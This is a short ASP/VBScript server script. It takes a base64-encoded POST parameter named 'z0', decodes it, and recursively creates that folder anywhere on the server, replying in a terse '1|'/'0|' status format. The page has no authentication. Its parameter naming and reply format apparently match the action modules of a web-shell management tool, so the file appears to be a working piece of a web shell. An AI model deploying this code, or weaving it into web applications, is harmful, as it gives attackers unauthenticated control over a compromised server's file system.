<%

On Error Resume Next

Function GetCurrentCharset()
    Dim charset
    charset = Response.CharSet
    If charset = "" Then
        Select Case Session.CodePage
            Case 65001 : charset = "utf-8"
            Case 1252  : charset = "windows-1252"
            Case 936   : charset = "gb2312"
            Case 950   : charset = "big5"
            Case 1251  : charset = "windows-1251"
            Case Else  : charset = "utf-8"
        End Select
    End If
    GetCurrentCharset = charset
End Function

Function Base64Decode(str)
    If Trim(str) = "" Then
        Base64Decode = ""
        Exit Function
    End If
    Dim xml, node, stream
    Set xml = Server.CreateObject("MSXML2.DOMDocument.6.0")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.text = str

    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write node.nodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.Charset = GetCurrentCharset()
    Base64Decode = stream.ReadText
    stream.Close
    Set stream = Nothing
    Set node = Nothing
    Set xml = Nothing
End Function

Sub CreateFolderRecursive(fso, path)
    If fso.FolderExists(path) Or path = "" Then Exit Sub
    
    Dim parentPath
    parentPath = fso.GetParentFolderName(path)
    
    If Not fso.FolderExists(parentPath) Then
        CreateFolderRecursive fso, parentPath
    End If
    
    fso.CreateFolder(path)
End Sub

Function Main()
    Dim z0
    z0 = Request.Form("z0")
    If Trim(z0) = "" Then
        Main = "0|Failed to create folder. (Missing parameter)"
        Exit Function
    End If

    Dim dir_name
    dir_name = Base64Decode(z0)

    Dim fso
    Set fso = Server.CreateObject("Scripting.FileSystemObject")

    If fso.FolderExists(dir_name) Then
        Main = "0|Folder already exists"
        Set fso = Nothing
        Exit Function
    End If

    On Error Resume Next
    CreateFolderRecursive fso, dir_name

    If Err.Number = 0 Then
        Main = "1|Created folder successfully."
    Else
        Main = "0|Failed to create folder. Error: " & Err.Description
    End If
    
    On Error GoTo 0
    Set fso = Nothing
End Function

Response.ContentType = "text/plain"
Response.Write Main()

%>